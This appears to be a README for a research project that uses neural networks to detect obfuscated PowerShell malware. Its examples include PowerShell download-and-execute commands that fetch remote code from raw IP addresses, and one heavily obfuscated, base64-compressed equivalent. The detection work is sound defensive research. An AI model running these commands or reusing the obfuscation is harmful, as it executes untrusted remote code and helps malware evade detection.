Yet Another Obfuscated Powershell Detector
---

Detecting malware is hard because this:
```
Invoke-Expression (New-Object Net.WebClient).DownloadString("102.115.168.149/kc2olMul") 
```
Does the same thing as this: 
```
& ( $shElLID[1]+$sHElLID[13]+'X') ( neW-OBJeCT SYsTeM.IO.comPREssiOn.DeFlAtesTReam( [iO.memoRYstReam][syStEm.COnvert]::FRombase64sTRING('VZDLjqJAAEV/hUUnQuxBHcvHdNILlGopQlFKYYMQFwiF1CgUr5aWrx8ys5rdSc7NXRxJlWTppcmYZaEknJ3HL9QYmA88P49H/kgZfAG9H+Riwm0r0VPTMqxyolK3ZhF2YJTAWv5vg4Qai7ysWUORsNUEplbksr/7XJbC5tm4/y4ww8Q5NW4No/wshTEpHtBpz29vHzXBF42yJRgksq/yyDrNbV2gDiInLS/s5zEqP0xDTJ94d/u8YkMHBx1oUZ1tKtF9kZXr9thePIJ9h3sEnozV1dUHLTgEOlnuJkeNEBRU/QNmros1zx+L291GCxETtEsSFBgTSgTIfxfpN8hW6BOUy1WXHtrpKqfL2QbxpPD0dQnMX5t7C9nXhDR5a88X69nEI0fz+3nzPL/1Murcd5wDK52O50EA11XVx47Zd0b3/j60fZVCLtStwGUNG8qJPXC+d1jTcFHkQodDjITFBO+dwUuK8hq6zHdVWGyJzu3roDUac64oqgM1vRXMTmRF+gM=' ), [sysTeM.io.coMpReSsion.coMpRessIonmoDe]::DeCoMPREsS) | % {neW-OBJeCT  SYsTEM.Io.STREAMrEaDer($_, [SYstEM.teXT.enCodIng]::aSCii )} |% {$_.readtoEnd( )} ) 

```

Another example, turns out that this:
![alt text](https://github.com/rctcwyvrn/YAOPD/blob/master/obfuscation.png "What the hell is this???")

Actually just does this:
```
Invoke-Expression (New-Object Net.WebClient).DownloadString("http://177.156.172.5/IssmLlg82") 
```

The solution? The solution to the rest of lifes problems, neural networks!

[Inspiration](https://www.endgame.com/blog/technical-blog/deobfuscating-powershell-putting-toothpaste-back-tube)

Part 1: Generate powershell with fake malicious commands + obfuscated versions  
Part 2: Train a classifier  
Part 3 (?): Deobfuscate  